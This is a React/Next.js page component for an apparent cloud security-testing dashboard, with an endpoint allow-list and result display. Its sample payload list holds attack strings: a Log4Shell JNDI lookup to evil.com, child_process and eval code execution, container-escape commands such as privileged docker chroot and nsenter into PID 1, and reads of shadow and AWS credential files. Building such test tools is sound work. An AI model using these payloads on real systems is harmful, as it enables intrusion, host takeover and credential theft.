'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { auth } from '@/lib/auth';
import { apiClient } from '@/lib/api';
import Navbar from '@/components/Navbar';
import Sidebar from '@/components/Sidebar';
import { Shield, Globe, Code, AlertTriangle, CheckCircle, XCircle, Loader, Info, Cloud } from 'lucide-react';

interface SecurityTestResult {
  test_type: string;
  target_url: string;
  payload: string;
  success: boolean;
  response: {
    status_code: number;
    response_time: string;
    content_length: number;
    headers: Record<string, string>;
    vulnerability_detected?: boolean;
    evidence?: string;
    risk_level?: string;
    recommendation?: string;
    protection?: string;
    database_type?: string;
  };
  timestamp: string;
}

const securityTestTypes = [
  { value: 'api_misconfiguration', label: 'API Misconfiguration', color: 'blue' },
  { value: 'iam_issues', label: 'IAM Permission Issues', color: 'orange' },
  { value: 's3_bucket_exposure', label: 'S3 Bucket Exposure', color: 'yellow' },
  { value: 'serverless_injection', label: 'Serverless Injection', color: 'purple' },
  { value: 'container_escape', label: 'Container Escape', color: 'green' }
];

const samplePayloads = {
  api_misconfiguration: [
    'GET /api/v1/users?admin=true',
    'POST /api/admin/config {"bypass": true}',
    'PUT /api/secrets/all',
    'DELETE /api/users/all'
  ],
  iam_issues: [
    'AssumeRole: arn:aws:iam::*:role/Admin',
    'GetObject: s3://*/confidential/*',
    'ListBuckets: *',
    'DescribeInstances: ec2:*'
  ],
  s3_bucket_exposure: [
    's3://company-backups/.aws/credentials',
    's3://logs-bucket/application.log',
    's3://config-bucket/database.conf',
    's3://public-bucket/../private/keys.pem'
  ],
  serverless_injection: [
    '${jndi:ldap://evil.com/exploit}',
    'require("child_process").exec("whoami")',
    'eval(Buffer.from("Y29uc29sZS5sb2coInB3bmVkIik=", "base64"))',
    'import("os").then(os=>os.exec("id"))'
  ],
  container_escape: [
    'docker run --privileged -v /:/host alpine chroot /host',
    'kubectl exec pod -- mount /dev/sda1 /mnt',
    '/proc/1/root/etc/shadow',
    'nsenter -t 1 -m -u -i -n -p bash'
  ]
};

const authorizedEndpoints = [
  'localhost',
  '127.0.0.1',
  'api.testcloud.com',
  'demo-api.amazonaws.com',
  'test.azurewebsites.net',
  'staging-app.herokuapp.com',
  'dev-api.firebaseapp.com',
  'sandbox.cloud.local',
  'test-env.local',
  'staging.local'
];

export default function CloudSecurityValidation() {
  const [testType, setTestType] = useState('api_misconfiguration');
  const [targetUrl, setTargetUrl] = useState('');
  const [payload, setPayload] = useState('');
  const [isTesting, setIsTesting] = useState(false);
  const [testResult, setTestResult] = useState<SecurityTestResult | null>(null);
  const [error, setError] = useState('');
  const [validationError, setValidationError] = useState('');
  const [urlValidationError, setUrlValidationError] = useState('');
  const router = useRouter();

  useEffect(() => {
    if (!auth.isAuthenticated()) {
      router.push('/login');
    }
    
    // Load previous test results from localStorage on component mount
    const savedResult = localStorage.getItem('lastSecurityTestResult');
    if (savedResult) {
      try {
        const parsedResult = JSON.parse(savedResult);
        setTestResult(parsedResult);
      } catch (e) {
        console.error('Error loading saved security test result:', e);
      }
    }
  }, [router]);

  useEffect(() => {
    // Set default payload when type changes
    const samples = samplePayloads[testType as keyof typeof samplePayloads];
    if (samples && samples.length > 0) {
      setPayload(samples[0]);
    }
  }, [testType]);

  const validateUrl = (url: string): boolean => {
    if (!url.trim()) return false;
    
    try {
      const urlObj = new URL(url.startsWith('http') ? url : `http://${url}`);
      const hostname = urlObj.hostname.toLowerCase();
      
      // Check if hostname matches any authorized endpoint
      return authorizedEndpoints.some(endpoint => {
        if (hostname === endpoint) return true;
        if (hostname.endsWith(`.${endpoint}`)) return true;
        return false;
      });
    } catch {
      return false;
    }
  };

  const handleUrlChange = (newUrl: string) => {
    setTargetUrl(newUrl);
    setValidationError('');
    setError('');
    setUrlValidationError('');
    
    if (newUrl.trim() && !validateUrl(newUrl)) {
      setUrlValidationError('Unauthorized endpoint. Please use only approved cloud testing environments listed below.');
    }
  };

  const handleTest = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    
    // Validation checks
    if (!targetUrl.trim()) {
      setValidationError('Please enter a target cloud endpoint');
      setError('');
      return;
    }
    
    if (!validateUrl(targetUrl)) {
      setUrlValidationError('Unauthorized endpoint. Please use only approved cloud testing environments.');
      setValidationError('');
      setError('');
      return;
    }
    
    if (!payload.trim()) {
      setValidationError('Please enter a test payload');
      setError('');
      return;
    }

    setError('');
    setValidationError('');
    setUrlValidationError('');
    setIsTesting(true);
    setTestResult(null);

    try {
      const response = await apiClient.testPayload(testType, targetUrl, payload);
      const result = response.data;
      setTestResult(result);
      
      // Save test result to localStorage
      localStorage.setItem('lastSecurityTestResult', JSON.stringify(result));
    } catch (err: any) {
      setError(err.response?.data?.detail || 'Security validation failed. Please try again.');
    } finally {
      setIsTesting(false);
    }
  };

  const handleClearUrl = () => {
    setTargetUrl('');
    setValidationError('');
    setError('');
    setUrlValidationError('');
  };

  const handleClearPayload = () => {
    setPayload('');
    setValidationError('');
    setError('');
  };

  const loadSamplePayload = (samplePayload: string) => {
    setPayload(samplePayload);
    setValidationError('');
    setError('');
  };

  const getRiskLevelColor = (level: string) => {
    switch (level?.toLowerCase()) {
      case 'critical':
        return 'text-red-400 bg-red-400/10';
      case 'high':
        return 'text-orange-400 bg-orange-400/10';
      case 'medium':
        return 'text-yellow-400 bg-yellow-400/10';
      case 'low':
        return 'text-green-400 bg-green-400/10';
      default:
        return 'text-gray-400 bg-gray-400/10';
    }
  };

  const getStatusColor = (status: number) => {
    if (status >= 200 && status < 300) return 'text-green-400';
    if (status >= 400 && status < 500) return 'text-yellow-400';
    if (status >= 500) return 'text-red-400';
    return 'text-gray-400';
  };

  return (
    <div className="min-h-screen bg-gray-900">
      <Navbar />
      <div className="flex">
        <Sidebar />
        <div className="md:pl-64 flex flex-col flex-1">
          <main className="flex-1">
            <div className="py-8">
              <div className="max-w-7xl mx-auto px-4 sm:px-6 md:px-8">
                {/* Header */}
                <div className="mb-8 text-center">
                  <div className="flex items-center justify-center space-x-3 mb-4">
                    <Shield 
                      className="h-8 w-8 text-blue-500" 
                      style={{ filter: 'drop-shadow(0 0 10px #3b82f6)' }} 
                    />
                    <h1 
                      className="text-3xl font-bold text-blue-500" 
                      style={{ textShadow: '0 0 10px #3b82f6' }}
                    >
                      Cloud Security Validation
                    </h1>
                  </div>
                  <p className="text-gray-400 text-lg max-w-3xl mx-auto">
                    Test cloud misconfigurations, API vulnerabilities, IAM issues and more 
                    to identify cloud-specific security weaknesses and compliance gaps.
                  </p>
                </div>

                {/* Legal Notice & Authorized Endpoints */}
                <div className="mb-10 bg-gradient-to-br from-blue-900/20 to-blue-800/10 border-2 border-blue-500/30 rounded-xl p-8">
                  <div className="flex items-center space-x-3 mb-4">
                    <AlertTriangle className="h-6 w-6 text-blue-400" />
                    <h2 className="text-xl font-bold text-blue-300">AUTHORIZED CLOUD TESTING ONLY</h2>
                  </div>
                  <div className="text-blue-100 mb-6">
                    <p className="font-semibold mb-2">This tool is restricted to authorized cloud testing environments only!</p>
                    <p className="text-sm">Testing against unauthorized cloud services may violate terms of service and result in account suspension.</p>
                  </div>
                  
                  <div className="bg-green-900/30 border-2 border-green-500/30 rounded-lg" style={{ padding: '32px' }}>
                    <h3 className="font-semibold text-green-200" style={{ marginBottom: '24px' }}>APPROVED CLOUD TESTING ENVIRONMENTS:</h3>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6 text-green-100">
                      <div>
                        <h4 className="font-medium text-green-200" style={{ marginBottom: '16px' }}>Public Cloud Test APIs:</h4>
                        <ul className="space-y-3 text-sm">
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">api.testcloud.com</code></li>
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">demo-api.amazonaws.com</code></li>
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">test.azurewebsites.net</code></li>
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">staging-app.herokuapp.com</code></li>
                        </ul>
                      </div>
                      <div>
                        <h4 className="font-medium text-green-200" style={{ marginBottom: '16px' }}>Local Cloud Environments:</h4>
                        <ul className="space-y-3 text-sm">
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">localhost</code> (any port)</li>
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">127.0.0.1</code> (any port)</li>
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">sandbox.cloud.local</code></li>
                          <li>• <code className="bg-green-800/30 px-3 py-2 rounded">test-env.local</code></li>
                        </ul>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Test Form */}
                <div className="bg-gray-800 shadow-xl rounded-xl p-8 mb-10">
                  <div className="flex flex-col items-center space-y-0">
                    {/* Security Test Type Selection */}
                    <div style={{ marginBottom: '32px', width: '100%', maxWidth: '600px' }}>
                      <label 
                        className="block font-bold text-white text-center" 
                        style={{ 
                          fontSize: '32px',
                          marginBottom: '24px',
                          color: 'white'
                        }}
                      >
                        Security Test Type
                      </label>
                      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3" style={{ gap: '16px' }}>
                        {securityTestTypes.map((type) => (
                          <label key={type.value} className="relative">
                            <input
                              type="radio"
                              name="testType"
                              value={type.value}
                              checked={testType === type.value}
                              onChange={(e) => setTestType(e.target.value)}
                              className="sr-only"
                            />
                            <div 
                              className={`cursor-pointer rounded-lg border-2 transition-colors text-center ${
                                testType === type.value
                                  ? 'bg-blue-700 border-blue-600 text-white'
                                  : 'border-gray-600 bg-gray-700 hover:border-gray-500 text-gray-300'
                              }`}
                              style={{ padding: '16px' }}
                            >
                              <div className="text-sm font-medium">{type.label}</div>
                              <div className="text-xs uppercase" style={{ marginTop: '4px' }}>{type.value.replace('_', ' ')}</div>
                            </div>
                          </label>
                        ))}
                      </div>
                    </div>

                    {/* Target URL */}
                    <div style={{ marginBottom: '16px' }}>
                      <label htmlFor="targetUrl" className="block text-lg font-bold text-white text-center" style={{ marginBottom: '12px' }}>
                        Target Cloud Endpoint
                      </label>
                      <div 
                        className="relative rounded-xl bg-gray-700 focus-within:ring-2 focus-within:ring-blue-500 transition-all duration-300"
                        style={{ 
                          width: '350px',
                          height: '50px',
                          margin: '0 auto',
                          border: '2px solid #374151'
                        }}
                      >
                        <div 
                          className="absolute flex items-center pointer-events-none"
                          style={{
                            top: '50%',
                            left: '12px',
                            transform: 'translateY(-50%)'
                          }}
                        >
                          <Globe className="h-5 w-5 text-gray-400" />
                        </div>
                        
                        {/* Clear button for URL */}
                        {targetUrl && (
                          <button
                            type="button"
                            onClick={handleClearUrl}
                            className="absolute flex items-center justify-center rounded-full bg-gray-600 hover:bg-gray-500 transition-colors duration-200"
                            style={{
                              top: '50%',
                              right: '8px',
                              transform: 'translateY(-50%)',
                              width: '20px',
                              height: '20px'
                            }}
                          >
                            <span className="text-white text-sm font-bold" style={{ lineHeight: '1' }}>×</span>
                          </button>
                        )}
                        
                        <input
                          type="url"
                          id="targetUrl"
                          value={targetUrl}
                          onChange={(e) => handleUrlChange(e.target.value)}
                          className={`text-white placeholder-gray-400 focus:outline-none bg-transparent rounded-xl transition-all duration-300 ${
                            urlValidationError ? 'ring-2 ring-red-500' : ''
                          }`}
                          style={{ 
                            width: '350px',
                            height: '50px',
                            paddingLeft: '40px',
                            paddingRight: targetUrl ? '36px' : '12px',
                            fontSize: '14px',
                            textAlign: 'center',
                            border: 'none',
                            backgroundColor: 'transparent'
                          }}
                          placeholder="https://api.testcloud.com/v1/users"
                        />
                      </div>
                    </div>

                    {/* Payload Input */}
                    <div style={{ marginBottom: '16px' }}>
                      <label htmlFor="payload" className="block text-lg font-bold text-white text-center" style={{ marginBottom: '12px' }}>
                        Test Payload
                      </label>
                      <div 
                        className="relative rounded-xl bg-gray-700 focus-within:ring-2 focus-within:ring-blue-500 transition-all duration-300"
                        style={{ 
                          width: '350px',
                          height: '60px',
                          margin: '0 auto',
                          border: '2px solid #374151'
                        }}
                      >
                        <div 
                          className="absolute flex items-center pointer-events-none"
                          style={{
                            top: '12px',
                            left: '12px'
                          }}
                        >
                          <Code className="h-5 w-5 text-gray-400" />
                        </div>
                        
                        {/* Clear button for Payload */}
                        {payload && (
                          <button
                            type="button"
                            onClick={handleClearPayload}
                            className="absolute flex items-center justify-center rounded-full bg-gray-600 hover:bg-gray-500 transition-colors duration-200"
                            style={{
                              top: '8px',
                              right: '8px',
                              width: '20px',
                              height: '20px'
                            }}
                          >
                            <span className="text-white text-sm font-bold" style={{ lineHeight: '1' }}>×</span>
                          </button>
                        )}
                        
                        <textarea
                          id="payload"
                          value={payload}
                          onChange={(e) => {
                            setPayload(e.target.value);
                            setValidationError('');
                            setError('');
                          }}
                          className="text-white placeholder-gray-400 focus:outline-none bg-transparent rounded-xl transition-all duration-300 resize-none"
                          style={{ 
                            width: '350px',
                            height: '60px',
                            paddingLeft: '40px',
                            paddingRight: payload ? '36px' : '12px',
                            paddingTop: '12px',
                            paddingBottom: '12px',
                            fontSize: '13px',
                            border: 'none',
                            backgroundColor: 'transparent',
                            fontFamily: 'monospace'
                          }}
                          placeholder="Enter your cloud security test payload..."
                        />
                      </div>
                    </div>

                    {/* URL Validation Error */}
                    {urlValidationError && (
                      <div 
                        className="bg-red-900/50 border border-red-500 rounded-lg p-3"
                        style={{ 
                          width: '350px',
                          marginBottom: '8px'
                        }}
                      >
                        <div className="flex items-start">
                          <AlertTriangle className="h-4 w-4 text-red-400 mr-2 mt-0.5 flex-shrink-0" />
                          <div>
                            <p className="text-xs text-red-300 font-semibold mb-1">{urlValidationError}</p>
                            <p className="text-xs text-red-200">Use approved endpoints like: api.testcloud.com</p>
                          </div>
                        </div>
                      </div>
                    )}

                    {/* General Validation Error */}
                    {validationError && !urlValidationError && (
                      <div 
                        className="bg-orange-900/50 border border-orange-500 rounded-lg p-3"
                        style={{ 
                          width: '350px',
                          marginBottom: '8px'
                        }}
                      >
                        <div className="flex items-center">
                          <AlertTriangle className="h-4 w-4 text-orange-400 mr-2" />
                          <p className="text-xs text-orange-300">{validationError}</p>
                        </div>
                      </div>
                    )}

                    {/* API Error */}
                    {error && (
                      <div 
                        className="bg-red-900/50 border border-red-500 rounded-lg p-3"
                        style={{ 
                          width: '350px',
                          marginBottom: '8px'
                        }}
                      >
                        <div className="flex items-center">
                          <AlertTriangle className="h-4 w-4 text-red-400 mr-2" />
                          <p className="text-xs text-red-300">{error}</p>
                        </div>
                      </div>
                    )}

                    <div 
                      style={{ marginTop: '8px' }}
                      className={urlValidationError ? 'opacity-50 pointer-events-none' : ''}
                    >
                      <button
                        type="submit"
                        disabled={isTesting || !!urlValidationError}
                        onClick={handleTest}
                        className="inline-flex items-center justify-center font-semibold rounded-lg shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed bg-blue-700 hover:bg-blue-800 text-white"
                        style={{ 
                          border: 'none',
                          padding: '12px 24px',
                          fontSize: '16px',
                          minWidth: '160px'
                        }}
                      >
                        {isTesting ? (
                          <>
                            <Loader className="animate-spin -ml-1 mr-2 h-5 w-5" />
                            Validating...
                          </>
                        ) : urlValidationError ? (
                          <>
                            <AlertTriangle className="-ml-1 mr-2 h-5 w-5" />
                            Unauthorized
                          </>
                        ) : (
                          <>
                            <Shield className="-ml-1 mr-2 h-5 w-5" />
                            Start Validation
                          </>
                        )}
                      </button>
                    </div>
                  </div>
                </div>

                {/* Sample Payloads */}
                <div className="bg-gray-800 shadow-lg rounded-lg p-4 mb-6">
                  <h3 className="text-md font-bold text-white mb-3 text-center">Sample Test Payloads</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                    {samplePayloads[testType as keyof typeof samplePayloads]?.slice(0, 4).map((sample, index) => (
                      <button
                        key={index}
                        onClick={() => loadSamplePayload(sample)}
                        className="text-left p-2 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                      >
                        <code className="text-xs text-green-400 break-all">{sample}</code>
                      </button>
                    ))}
                  </div>
                  
                  <div className="mt-3 p-2 bg-blue-900/30 border border-blue-500/30 rounded-md">
                    <div className="flex">
                      <Info className="h-4 w-4 text-blue-400 mt-0.5 mr-2 flex-shrink-0" />
                      <p className="text-xs text-blue-300">
                        Click any sample to load it. Only test on authorized cloud environments.
                      </p>
                    </div>
                  </div>
                </div>

                {/* Test Results */}
                {testResult && (
                  <div className="space-y-8">
                    {/* Result Summary */}
                    <div className="bg-gray-800 shadow-xl rounded-xl p-6">
                      <div className="flex items-center justify-between mb-6">
                        <h2 className="text-2xl font-bold text-white">Validation Results</h2>
                        <div className="flex items-center space-x-2">
                          {testResult.success ? (
                            <>
                              <CheckCircle className="h-6 w-6 text-green-400" />
                              <span className="text-green-400 font-semibold">VULNERABILITY FOUND</span>
                            </>
                          ) : (
                            <>
                              <XCircle className="h-6 w-6 text-red-400" />
                              <span className="text-red-400 font-semibold">SECURE</span>
                            </>
                          )}
                        </div>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
                        <div className="bg-gray-700 rounded-xl p-4">
                          <p className="text-sm text-gray-400">Status Code</p>
                          <p className={`text-lg font-semibold ${getStatusColor(testResult.response.status_code)}`}>
                            {testResult.response.status_code}
                          </p>
                        </div>
                        
                        <div className="bg-gray-700 rounded-xl p-4">
                          <p className="text-sm text-gray-400">Response Time</p>
                          <p className="text-lg font-semibold text-white">{testResult.response.response_time}</p>
                        </div>
                        
                        <div className="bg-gray-700 rounded-xl p-4">
                          <p className="text-sm text-gray-400">Content Length</p>
                          <p className="text-lg font-semibold text-white">{testResult.response.content_length} bytes</p>
                        </div>
                        
                        {testResult.response.risk_level && (
                          <div className="bg-gray-700 rounded-xl p-4">
                            <p className="text-sm text-gray-400">Risk Level</p>
                            <span className={`inline-flex px-3 py-1 text-sm font-semibold rounded-full ${getRiskLevelColor(testResult.response.risk_level)}`}>
                              {testResult.response.risk_level.toUpperCase()}
                            </span>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Additional result sections would go here */}
                  </div>
                )}
              </div>
            </div>
          </main>
        </div>
      </div>
    </div>
  );
}